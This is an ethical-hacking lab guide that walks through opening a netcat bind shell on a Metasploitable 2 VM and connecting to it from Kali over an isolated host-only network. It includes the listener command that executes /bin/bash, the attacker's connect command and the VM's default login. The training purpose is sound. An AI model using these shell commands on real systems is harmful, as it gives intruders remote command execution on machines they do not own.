EH – Netcat Shell_02 (Bind Shell Lab Guide)
🎯 Objective

Learn how to use Netcat to establish a bind shell on a target machine.

📖 Purpose

Unlike reverse shells, a bind shell creates a listener on the target (victim) and waits for the attacker to connect in.
This is less common (since firewalls block inbound connections), but it’s still an important concept to learn.

🛠️ Tools

Kali Linux VM → Attacker machine

Metasploitable 2 VM → Target machine

🌐 Topology

Both machines must be on the same host-only isolated network in VirtualBox/VMware.

[Kali Linux - Attacker]  <---- Host-Only Network ---->  [Metasploitable - Victim]


Default Metasploitable login:

username: msfadmin
password: msfadmin

📝 Lab Tasks
🔹 Task 1: Get Target IP Address (Metasploitable)

On the Metasploitable VM:

ifconfig


📌 Example output:

eth0   inet addr:192.168.56.102


Here, the victim’s IP is 192.168.56.102.

🔹 Task 2: Create a Bind Shell on the Victim

On the Metasploitable VM, run:

sudo su -
sudo nc -lvnp 443 -e /bin/bash


Explanation of flags:

-l → Listen mode

-v → Verbose output

-n → Don’t resolve DNS

-p 443 → Port to listen on

-e /bin/bash → Executes bash once attacker connects

Now the target is waiting for the attacker to connect.

🔹 Task 3: Connect to the Bind Shell (Kali)

On the Kali VM, connect to the bind shell:

nc 192.168.56.102 443

🔹 Task 4: Verify Access

Now you should have a shell on the victim machine. Test it by running:

whoami
id
uname -a


✅ If successful, these commands execute on the Metasploitable machine but output to your Kali terminal.

⚠️ Notes

Bind shells often fail on real-world systems because firewalls block incoming connections.

Reverse shells (Lab 01) are more common, but bind shells are still useful to understand.

✅ Result

You can now connect from Kali → Metasploitable using a bind shell. You’re executing commands on the target directly through Netcat.
